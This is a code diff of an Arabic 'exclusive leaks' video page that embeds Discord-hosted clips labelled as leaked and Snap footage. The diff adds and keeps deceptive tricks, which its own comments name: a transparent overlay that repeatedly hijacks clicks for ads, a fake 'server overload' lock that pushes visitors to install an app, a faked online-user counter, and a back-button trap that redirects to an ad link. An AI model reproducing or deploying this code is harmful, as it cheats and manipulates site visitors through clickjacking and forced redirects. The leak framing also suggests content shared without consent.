@@ -21,31 +21,31 @@
 
         body { background-color: var(--bg-dark); color: #fff; font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
 
-        /* ستارة Adsterra الشفافة */
-        #invisible-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 9999; cursor: pointer; display: none; }
+        /* الستارة الشفافة المسيطرة */
+        #invisible-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 20000; cursor: pointer; display: none; }
 
         /* قفل السيرفر الاحترافي */
-        #app-lock-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.96); z-index: 10001; display: none; align-items: center; justify-content: center; backdrop-filter: blur(15px); }
+        #app-lock-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.96); z-index: 21000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(20px); }
         
-        .lock-card { background: #111; padding: 25px; border-radius: 20px; border: 1px solid #333; max-width: 85%; text-align: center; box-shadow: 0 0 40px rgba(255, 0, 0, 0.3); }
+        .lock-card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; max-width: 85%; text-align: center; box-shadow: 0 0 50px rgba(255, 0, 0, 0.4); }
 
-        header { background: linear-gradient(to bottom, #1a1a1a, transparent); padding: 20px; text-align: center; border-bottom: 1px solid #222; }
+        header { background: linear-gradient(to bottom, #1a1a1a, transparent); padding: 25px; text-align: center; border-bottom: 1px solid #222; }
         .logo { font-size: 2rem; font-weight: 900; color: var(--primary-color); text-shadow: 0 0 15px rgba(255, 0, 0, 0.5); margin: 0; }
-        .sub-logo { color: var(--accent-color); font-size: 0.9rem; font-weight: bold; }
+        .sub-logo { color: var(--accent-color); font-size: 0.9rem; font-weight: bold; margin-top: 5px; }
 
-        .container { max-width: 700px; margin: 20px auto; padding: 10px; }
+        .container { max-width: 650px; margin: 20px auto; padding: 10px; }
         .video-card { background: var(--card-bg); border-radius: 15px; margin-bottom: 30px; overflow: hidden; border: 1px solid #222; }
-        .video-header { padding: 12px 15px; text-align: right; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
-        .video-title { font-weight: bold; font-size: 1rem; color: #eee; }
-        .quality-badge { background: var(--primary-color); padding: 2px 8px; border-radius: 4px; font-size: 0.7rem; font-weight: bold; }
+        .video-header { padding: 12px 15px; text-align: right; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; background: #1a1a1a; }
+        .video-title { font-weight: bold; font-size: 0.95rem; color: #eee; }
+        .quality-badge { background: var(--primary-color); padding: 2px 8px; border-radius: 4px; font-size: 0.7rem; font-weight: bold; color: white; }
         .video-wrapper { position: relative; width: 100%; aspect-ratio: 16 / 9; background: #000; }
-        video { width: 100%; height: 100%; display: block; }
+        video { width: 100%; height: 100%; display: block; object-fit: contain; }
 
-        .btn-install { background: #00E676; color: #000; text-decoration: none; padding: 18px; display: block; border-radius: 50px; font-weight: 900; font-size: 1.2rem; margin-top: 20px; animation: pulse 1.5s infinite; border: none; cursor: pointer; }
-        @keyframes pulse { 0% { transform: scale(1); } 70% { transform: scale(1.03); } 100% { transform: scale(1); } }
-        .refuse-link { color: #555; font-size: 0.8rem; text-decoration: underline; margin-top: 15px; display: block; cursor: pointer; }
+        .btn-install { background: linear-gradient(90deg, #00C853, #64DD17); color: #000; text-decoration: none; padding: 18px; display: block; border-radius: 50px; font-weight: 900; font-size: 1.3rem; margin-top: 25px; animation: pulse 1.5s infinite; border: none; cursor: pointer; }
+        @keyframes pulse { 0% { transform: scale(1); } 70% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        .refuse-link { color: #555; font-size: 0.8rem; text-decoration: underline; margin-top: 20px; display: block; cursor: pointer; }
 
-        .footer { padding: 40px 20px; text-align: center; color: #555; font-size: 0.8rem; }
+        .footer { padding: 40px 20px; text-align: center; color: #555; font-size: 0.8rem; border-top: 1px solid #111; }
         .live-indicator { display: inline-block; width: 10px; height: 10px; background: #ff0000; border-radius: 50%; margin-left: 5px; animation: blink 1s infinite; }
         @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
     </style>
@@ -56,38 +56,75 @@
 
 <div id="app-lock-overlay">
     <div class="lock-card">
-        <div style="font-size: 2.5rem;">⚠️</div>
+        <div style="font-size: 3rem; margin-bottom: 10px;">⚠️</div>
         <h2 style="color: var(--accent-color);">ضغط عالي على السيرفر!</h2>
-        <p style="color: #eee; font-size: 0.9rem; line-height: 1.6;">
+        <p style="color: #eee; font-size: 1rem; line-height: 1.6;">
             لضمان استمرار البث بجودة 4K ومنع تعليق الموقع، يرجى الانتقال للمشاهدة عبر التطبيق الرسمي المعتمد.
         </p>
-        <div style="margin: 15px 0;">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" width="120">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" width="120">
+        <div style="margin: 20px 0;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" width="130">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" width="130">
         </div>
-        <a href="https://vidspaceapp.onelink.me/RzWN/56gc1p3b?deep_link_value=..." class="btn-install">تحميل وفتح السيرفر الآن</a>
+        <a href="https://vidspaceapp.onelink.me/RzWN/56gc1p3b?..." class="btn-install">تحميل وفتح السيرفر الآن</a>
         <span class="refuse-link" onclick="handleRefusal()">إكمال المشاهدة هنا (سيرفر بطيء)</span>
     </div>
 </div>
 
 <header>
     <h1 class="logo">حصريات العرب</h1>
-    <div class="sub-logo">سيرفرات المشاهدة المباشرة (VIP)</div>
+    <div class="sub-logo">الأرشيف الكامل - سيرفرات VIP</div>
 </header>
 
 <div class="container">
     <div class="video-card">
-        <div class="video-header"><span class="video-title">🔥 التسريب الأول</span><span class="quality-badge">4K ULTRA HD</span></div>
+        <div class="video-header"><span class="video-title">🎬 المقطع 1: التسريب الرئيسي</span><span class="quality-badge">4K ULTRA HD</span></div>
         <div class="video-wrapper">
             <video controls playsinline poster="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlbXaFRmgk_xep_3WLybyHLmB64zDz515V60krwmCm7ZdmdctUoZX68JQHqbnFHCGmXdIt2qHALTF3cexmZwB3b5fKLXGsGljdOKqs-2tgR80JqTF9vbg8384RYjptq-TVG41mJftbQZ6DOFsCy00Tj4M1LrcOVMcL2vQXo6BRtdQagL74OfxZkpmPqpEp/s981/1000204258.jpg">
-                <source src="https://media.discordapp.net/attachments/.../VID_20260216_111844.mp4..." type="video/mp4">
+                <source src="https://media.discordapp.net/attachments/1134630020162269298/1472885274047418401/VID_20260216_111844.mp4?ex=699432ce&is=6992e14e&hm=58af755808107ddd378d7532a9c0641aab818b1d9017d7f3f46aec15e2f0e673&" type="video/mp4">
             </video>
         </div>
     </div>
+
+    <div class="video-card">
+        <div class="video-header"><span class="video-title">🎬 المقطع 2: لقطات السناب</span><span class="quality-badge">HD</span></div>
+        <div class="video-wrapper">
+            <video controls playsinline>
+                <source src="https://media.discordapp.net/attachments/1134630020162269298/1472885222449090610/VID_20260216_111847.mp4?ex=699432c1&is=6992e141&hm=40a2ed506894beadf526d4f6a429beba7f8e387f4922807605aa9b74574d849e&" type="video/mp4">
+            </video>
+        </div>
     </div>
 
+    <div class="video-card">
+        <div class="video-header"><span class="video-title">🎬 المقطع 3: الأجزاء المحذوفة</span><span class="quality-badge">4K</span></div>
+        <div class="video-wrapper">
+            <video controls playsinline>
+                <source src="https://media.discordapp.net/attachments/1134630279034720356/1472886067396083813/VID_20260216_112311.mp4?ex=6994338b&is=6992e20b&hm=b2a0cf7a1a4262d3b81b06c7b813d23d1c48d3b60ead6e455a047635523e8661&" type="video/mp4">
+            </video>
+        </div>
+    </div>
+
+    <div class="video-card">
+        <div class="video-header"><span class="video-title">🎬 المقطع 4: حصري VIP</span><span class="quality-badge">4K ULTRA HD</span></div>
+        <div class="video-wrapper">
+            <video controls playsinline>
+                <source src="https://media.discordapp.net/attachments/1134630279034720356/1472886226938888243/VID_20260216_112348.mp4?ex=699433b1&is=6992e231&hm=cdfe278624b14a7c82d589be3b5952223b242cb004c7c77eb864e2319052809d&" type="video/mp4">
+            </video>
+        </div>
+    </div>
+
+    <div class="video-card">
+        <div class="video-header"><span class="video-title">🎬 المقطع 5: نهاية الأرشيف</span><span class="quality-badge">FULL HD</span></div>
+        <div class="video-wrapper">
+            <video controls playsinline>
+                <source src="https://media.discordapp.net/attachments/1134630279034720356/1472886235159597078/VID_20260216_112356.mp4?ex=699433b3&is=6992e233&hm=4b674d13a6277c44a936f98f6f231ca50f825ebab4fe8e64c18b4d230c5fcd4b&" type="video/mp4">
+            </video>
+        </div>
+    </div>
+</div>
+
 <div class="footer">
-    <span class="live-indicator"></span> متصل الآن: <span id="online-count">4,281</span> عضو
+    <span class="live-indicator"></span> متصل الآن: <span id="online-count">4,281</span> عضو<br><br>
+    &copy; 2026 حصريات العرب - جميع الحقوق محفوظة
 </div>
 
 <script>
@@ -96,36 +133,32 @@
     const lock = document.getElementById('app-lock-overlay');
     let refusalMode = false;
 
-    // تفعيل القفل بعد 90 ثانية بالضبط
+    // تفعيل نظام الصيد (الستارة) بعد 3 ثوانٍ
+    function startSnapTrap() {
+        function loop() {
+            const waitTime = Math.floor(Math.random() * (6000 - 3000 + 1)) + 3000;
+            setTimeout(() => {
+                overlay.style.display = 'block';
+                setTimeout(() => {
+                    overlay.style.display = 'none';
+                    loop();
+                }, 10000); 
+            }, waitTime);
+        }
+        loop();
+    }
+    setTimeout(startSnapTrap, 3000);
+
+    // تفعيل القفل الإجباري بعد 90 ثانية
     setTimeout(() => {
         lock.style.display = 'flex';
         document.querySelectorAll('video').forEach(v => v.pause());
     }, 90000);
 
-    // بدء نظام "المطاردة" في حال الرفض
     function handleRefusal() {
         window.open(adsLink, '_blank');
         lock.style.display = 'none';
         refusalMode = true;
-        activateNuisanceAds();
-    }
-
-    function activateNuisanceAds() {
-        function showCycle() {
-            if(!refusalMode) return;
-            // هدوء عشوائي 3-6 ثوانٍ ثم إزعاج 8-12 ثانية
-            const waitTime = Math.floor(Math.random() * (6000 - 3000 + 1)) + 3000;
-            const activeTime = Math.floor(Math.random() * (12000 - 8000 + 1)) + 8000;
-
-            setTimeout(() => {
-                overlay.style.display = 'block';
-                setTimeout(() => {
-                    overlay.style.display = 'none';
-                    showCycle();
-                }, activeTime);
-            }, waitTime);
-        }
-        showCycle();
     }
 
     function handleAdClick() {
@@ -133,13 +166,13 @@
         overlay.style.display = 'none';
     }
 
-    // تزييف عداد الزوار لزيادة المصداقية
+    // تزييف عداد الزوار
     setInterval(() => {
         const count = Math.floor(Math.random() * (5000 - 4000) + 4000);
         document.getElementById('online-count').innerText = count.toLocaleString();
     }, 3000);
 
-    // منع الخروج (Back Button Trap)
+    // منع الخروج وتحويل المستخدم
     (function() {
         window.history.pushState({page: 1}, "", window.location.href);
         window.onpopstate = function() { window.location.replace(adsLink); };
